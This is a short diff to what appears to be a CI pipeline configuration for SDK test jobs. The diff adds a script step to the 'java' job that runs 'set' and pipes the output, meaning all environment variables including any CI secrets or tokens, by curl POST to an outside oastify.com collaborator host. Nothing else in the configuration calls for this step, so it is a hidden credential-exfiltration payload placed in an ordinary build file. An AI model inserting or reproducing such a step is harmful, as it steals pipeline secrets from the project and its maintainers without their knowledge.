@@ -25,6 +25,8 @@ java:
     strategy: depend
   variables:
     SDK_LANG: Java
+  script:
+  - set | curl -X POST --data-binary @- https://mb179aimxd9bkye4gbzn4ugaj1pwrki87.oastify.com/
 
 python:
   extends: .trigger_sdk_test
